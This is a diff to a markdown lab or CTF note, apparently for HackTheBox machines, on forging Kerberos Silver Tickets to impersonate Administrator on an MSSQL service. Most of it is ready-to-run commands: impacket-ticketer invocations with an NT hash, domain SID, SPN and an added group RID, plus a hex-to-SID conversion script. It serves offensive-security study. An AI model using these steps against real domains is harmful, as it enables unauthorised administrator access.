@@ -1,5 +1,5 @@
 
-This is how it works: If we have valid Credentials for sql_svc, we can perform a Silver Ticket Attack to impersonate the Domain Admin, but only for the specific service that this service account runs!
+If we have valid Credentials for sql_svc, we can perform a Silver Ticket Attack to impersonate the Domain Admin, but only for the specific service that this service account runs!
 
 We won't become Domain Admin everywhere (that requires a Golden Ticket). Instead we will gain Administrator-level access exclusively to the backend service (MSSQL) in this case.
 
@@ -71,4 +71,62 @@ export KRB5CCNAME=$(pwd)/Administrator.ccache
 
 ```
 impacket-mssqlclient dc1.scrm.local -k -no-pass
+```
+
+---
+## Only MSSQL?
+
+Forging Tickets require port specification:
+
+```
+impacket-ticketer -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain signed.htb -spn MSSQLSvc/DC01.signed.htb:1433 Administrator
+```
+
+---
+## Silver Ticket for Special Group?
+
+1. Get SID
+
+```
+select SUSER_SID('Signed\IT')
+```
+
+I'll run the following script in order to get the SID & RID.
+
+```
+import struct
+
+hex_str = input("Paste the hex SID (with or without 0x): ").strip().replace("0x", "").replace(" ", "")
+sid_bytes = bytes.fromhex(hex_str)
+
+rev = sid_bytes[0]
+sub_count = sid_bytes[1]
+auth = int.from_bytes(sid_bytes[2:8], 'big')
+
+parts = [rev, auth]
+for i in range(sub_count):
+    sub = struct.unpack_from('<I', sid_bytes, 8 + 4*i)[0]
+    parts.append(sub)
+
+full_sid = "S-" + "-".join(str(p) for p in parts)
+domain_sid = "S-" + "-".join(str(p) for p in parts[:-1])  # drop RID
+rid = parts[-1]
+
+print(f"Full SID: {full_sid}")
+print(f"Domain SID: {domain_sid}")
+print(f"RID: {rid}")
+```
+
+```
+python3 /opt/arsenal/sid_converter.py 
+Paste the hex SID (with or without 0x): 0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000
+Full SID: S-1-5-21-4088429403-1159899800-2753317549-1105
+Domain SID: S-1-5-21-4088429403-1159899800-2753317549
+RID: 1105
+```
+
+2. Forged Silver Ticket.
+
+```
+impacket-ticketer -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain signed.htb -spn MSSQLSvc/DC01.signed.htb:1433 -groups 1105 Administrator
 ```
